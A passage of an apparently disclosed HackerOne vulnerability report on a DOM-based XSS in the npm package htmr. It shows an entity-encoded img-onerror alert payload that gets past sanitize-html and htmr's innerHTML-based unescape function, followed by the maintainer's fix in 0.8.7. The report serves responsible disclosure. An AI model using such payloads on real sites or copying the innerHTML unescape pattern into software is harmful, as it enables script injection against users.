FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=9252b2d378f1cc8107347e680d4609bcf8a214d78a7b4c3a9e109cb74743c382\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOkay so XSS \u003cstrong\u003edoesn\u0026#39;t\u003c/strong\u003e work, as expected.\u003c/p\u003e\n\n\u003cp\u003eBut now, let\u0026#39;s change \u003ccode\u003euserInput\u003c/code\u003e into encoded HTML entities, i.e. \u003ccode\u003e\u0026lt;\u003c/code\u003e into \u003ccode\u003e\u0026amp;lt;\u003c/code\u003e and \u003ccode\u003e\u0026gt;\u003c/code\u003e into \u003ccode\u003e\u0026amp;gt;\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport React from \u0026#39;react\u0026#39;;\nimport convert from \u0026#39;htmr\u0026#39;;\nimport sanitizeHtml from \u0026#39;sanitize-html\u0026#39;;\n\nexport default function App() {\n  const userInput = \u0026#39;\u0026amp;lt;img src=x onerror=alert(\u0026quot;xss\u0026quot;)\u0026amp;gt;\u0026#39;;\n  const sanitizedUserInput = sanitizeHtml(userInput);\n  return convert(`\u0026lt;p\u0026gt;${sanitizedUserInput}\u0026lt;/p\u0026gt;`);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd start the server:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2019-12-09_at_21.01.51.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qviq8pQxjjWnV7NefNYe31GM?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_21.01.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_21.01.51.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=e1c95c8438a559f4ace1fa8c1342fed7134f94137b53740a18318ad25f06e76a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qviq8pQxjjWnV7NefNYe31GM?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_21.01.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_21.01.51.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064656Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026amp;X-Amz-Signature=e1c95c8438a559f4ace1fa8c1342fed7134f94137b53740a18318ad25f06e76a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBoom, XSS is triggered. The developer \u003cstrong\u003ealready sanitized\u003c/strong\u003e user input as you\u0026#39;ve said, but it is still vulnerable. How does that happen?\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s take a look at the source code \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpveyes%2Fhtmr%2Fblob%2F3f44a0bd826411161c88dcdbadb261edf511b3ed%2Fsrc%2Fbrowser.ts%23L30-L31\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehtmr/browser.ts#L30-L31\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  // snip...\n  } else if (node.nodeType === NodeTypes.TEXT) {\n    const text = unescape(node.textContent);\n  // snip...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile converting nodes, if node is a TEXT, the module will \u003ccode\u003eunescape\u003c/code\u003e the node\u0026#39;s \u003ccode\u003etextContent\u003c/code\u003e. In HTML, \u003ccode\u003etextContent\u003c/code\u003e already contains \u003cstrong\u003edecoded\u003c/strong\u003e characters. So for example, if a node\u0026#39;s \u003ccode\u003einnerHTML\u003c/code\u003e is \u003ccode\u003e\u0026amp;lt;img...\u003c/code\u003e, the node\u0026#39;s \u003ccode\u003etextContent\u003c/code\u003e is \u003ccode\u003e\u0026lt;img...\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eNow let\u0026#39;s take a look at \u003ccode\u003eunescape\u003c/code\u003e function.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction unescape(str: string): string {\n  // Here we use innerHTML to unescape html entities.\n  // This is okay because we use the returned value as react children\n  // not dangerouslySetInnerHTML\n  tempEl.innerHTML = str;\n  return tempEl.textContent!;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe author uses \u003ccode\u003einnerHTML\u003c/code\u003e to unescape the content. It is dangerous because it will introduce DOM-based XSS. The solution here is not to use \u003ccode\u003einnerHTML\u003c/code\u003e at all.\u003c/p\u003e\n\n\u003cp\u003eI will appreciate if you take a look at this once again.\u003cbr\u003e\nThank you and regards,\u003cbr\u003e\nVisat\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T14:25:57.189Z","updated_at":"2019-12-09T14:25:57.189Z","actor":{"username":"visat","cleared":false,"url":"/visat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":654749,"filename":"Screen_Shot_2019-12-09_at_21.01.51.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qviq8pQxjjWnV7NefNYe31GM?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_21.01.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_21.01.51.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064656Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026X-Amz-Signature=e1c95c8438a559f4ace1fa8c1342fed7134f94137b53740a18318ad25f06e76a"},{"id":654748,"filename":"Screen_Shot_2019-12-09_at_20.56.55.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/M8Kz6KHjZ1KwYe4gtYGb6y3A?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-09_at_20.56.55.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-09_at_20.56.55.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4BCTVX7H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064656Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD9KoIrMtYjsPMNAoz3fkIjMCGzGeE4AC6fZNsgc%2FNK1QIhANJsfJivva8u7YF1XCVwz2O44bXLlD4DSJhj7xaMke6RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgzmYD94JaVjjIU2krEqkQPkOp7o1Y%2F3O46uPVkJpWKluhPjw6yqgkTOXGekCyVjJWTTKaV%2Fg4VslprjcyOrHq6Kvjx6FFrvI%2F0oeazfhhuVbsGzIX%2FDNyDl86o7E8p7xdE9njyFrZSTuG%2BcoCSQTNZm6K7xytZ808%2FmbOq1EsQaswjTfJE49knSO3dd6P9o4TMruMzu8iALfM0IqlU4CgtICPjNu1SwD5gIiOjS3JXo97WJ%2FeXaWM7uiiaZIfnwM1%2FJh%2B%2Bf4y2CVgdWsivBsUOOKr5Ffs4r9dvRgpxa%2BT%2FmspuhFLSjdwidy384ywNVej%2Fu5TtU0RmHvya7IsEPuuyEVKZ9GXWYeHJPMuJLhkj%2F9NgnnqTSYay6UqseBG9goY2oONYS%2Fy7uIy6pIkzSjH260rcLKe0FPxGZ3OZNA097jOWSnOIGGcV1YZW18F%2FQaHb3tqnILMft5hGAudbC%2F2kJRmQyb4mArK%2Bic9Gh50TdBT%2BX29t3Wo5dLJweBsKIOOdeF41%2BqY1abZEgoOIbiscyoLBMO4ChJxBEiM%2By%2Bjg8FjC%2B6ar%2FBTrqAdRlQf357Lw7olVqK9BuDw0RNDzAgG1%2BRjmEy94ivfSQKRkYnOaGVWNx1MekakiogYuOKzbAujbete9Cin2JFJP4a22qFOVAg7tsJ%2FeJITiLIkogRaku8DmGovq%2B04Yxq2jfRp5la%2FeG3Fqca5Jc2WM%2BO7QxCdRE21wSAgKnCwsy8vQV1X0gGJjUOV6UsIimNdWCtKUego7nGl1OprelVr%2FiPIFvPy%2BhWrWWJF9nHO59wa4OZtoRJ5df5%2ByoAAAuIWDBKZfHRv45K8z7hZFmm4sjyreHKi0tXU9Fadu828o5w%2B3CHi4r%2BAT0Pg%3D%3D\u0026X-Amz-Signature=9252b2d378f1cc8107347e680d4609bcf8a214d78a7b4c3a9e109cb74743c382"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6503578,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Hi @visat,\n\nThank you for the additional information. We will investigate.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/visat\"\u003e@visat\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for the additional information. We will investigate.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T14:29:13.624Z","updated_at":"2019-12-09T14:29:13.624Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6848721,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T11:11:28.811Z","updated_at":"2020-01-23T11:11:28.811Z","actor":{"username":"pveyes","cleared":false,"url":"/pveyes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6848746,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the thorough report, I'm currently investigating","markdown_message":"\u003cp\u003eThanks for the thorough report, I\u0026#39;m currently investigating\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T11:15:31.100Z","updated_at":"2020-01-23T11:15:31.100Z","actor":{"username":"pveyes","cleared":false,"url":"/pveyes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7029608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pveyes I see that version 0.8.7 has been released. Does it fix the XSS vulnerability?","markdown_message":"\u003cp\u003e\u003ca href=\"/pveyes\"\u003e@pveyes\u003c/a\u003e I see that version 0.8.7 has been released. Does it fix the XSS vulnerability?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-12T09:51:03.644Z","updated_at":"2020-02-12T09:51:03.644Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7037994,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all, sorry forgot to update here, I've released 0.8.7 that removes usage of innerHTML. This should fix the XSS issue. I've also tested this version in both my blog and usage in my companies and found no regression so I can release it in patch version\n\nIf you still find any vulnerabilities, feel free to ping me","markdown_message":"\u003cp\u003eHi all, sorry forgot to update here, I\u0026#39;ve released 0.8.7 that removes usage of innerHTML. This should fix the XSS issue. I\u0026#39;ve also tested this version in both my blog and usage in my companies and found no regression so I can release it in patch version\u003c/p\u003e\n\n\u003cp\u003eIf you still find any vulnerabilities, feel free to ping me\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-13T06:53:38.606Z","updated_at":"2020-02-13T06:53:38.606Z","actor":{"username":"pveyes","cleared":false,"url":"/pveyes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7038679,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-13T08:20:10.304Z","updated_at":"2020-02-13T08:20:10.304Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (6.5)","old_severity_id":584045,"new_severity_id":632415},"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7038684,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pveyes Thanks for the confirmation.\n\n@visat @beagle can you confirm that the vulnerability has been fixed in `htmlr` version 0.8.7?","markdown_message":"\u003cp\u003e\u003ca href=\"/pveyes\"\u003e@pveyes\u003c/a\u003e Thanks for the confirmation.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/visat\"\u003e@visat\u003c/a\u003e \u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e can you confirm that the vulnerability has been fixed in \u003ccode\u003ehtmlr\u003c/code\u003e version 0.8.7?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-13T08:21:28.868Z","updated_at":"2020-02-13T08:21:28.868Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7040180,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @marcinhoppe\nI can confirm it has been fixed in 0.8.7. Thanks.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e\u003cbr\u003e\nI can confirm it has been fixed in 0.8.7. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-13T09:45:44.979Z","updated_at":"2020-02-13T09:45:44.979Z","actor":{"username":"visat","cleared":false,"url":"/visat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7050465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@visat Thanks, I will request disclosure.","markdown_message":"\u003cp\u003e\u003ca href=\"/visat\"\u003e@visat\u003c/a\u003e Thanks, I will request disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-14T08:10:19.052Z","updated_at":"2020-02-14T08:10:19.052Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7050466,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-14T08:10:29.389Z","updated_at":"2020-02-14T08:10:29.389Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"visat","url":"/visat"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7050468,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-14T08:10:36.358Z","updated_at":"2020-02-14T08:10:36.358Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7320797,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-15T08:10:39.880Z","updated_at":"2020-03-15T08:10:39.880Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}